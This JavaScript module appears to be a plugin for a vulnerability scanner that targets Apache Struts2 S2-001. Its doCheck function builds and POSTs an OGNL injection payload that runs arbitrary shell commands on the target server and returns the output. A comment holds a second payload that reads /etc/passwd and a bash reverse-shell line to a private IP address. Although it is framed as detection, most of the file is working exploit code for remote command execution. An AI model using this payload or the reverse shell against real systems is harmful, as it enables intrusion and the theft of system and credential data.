
module.exports={
	tags:"struts2,001,ww-2030,2030,parms,web",
	des:"WW-2030,struts2 001Vulnerability detection",
	VulApps:[
		"https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-001",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-001.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-001",
		"http://issues.apache.org/struts/browse/WW-2030"],
		
	/*
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
// http://192.168.10.216:8088/S2-001/login.action
// bash -i >& /dev/tcp/192.168.24.90/8080 0>&1
	*/
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this,_s = this.self;
		parms || (parms = {});
		var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + _s.g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + _s.g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
			+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
			+ ',#wt=#f.getWriter()'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#wt.flush()'
			+',#wt.close()}');

		var a = '';
		for(var k in parms)
		{
			a += k + "=" + encodeURIComponent(s) + "&";
			parms[k] = s;
		}
		_s.request(({method: 'POST',uri: url 
			,body:a
			,headers:
		    {
		    	"user-agent": _s.g_szUa
		    }}),
	    	function(e,r,b)
		    {
		    	_s.error(e);
		    	_s.fnShowBody(b);
		    	_s.fnDoBody(b,"s2-001",url,null,function(o)
		    	{
		    		var r = {"url":url,"send":a};
	  				fnCbk(_s.copyO2O(r,o),_t);
		    	});
		    });
	}
};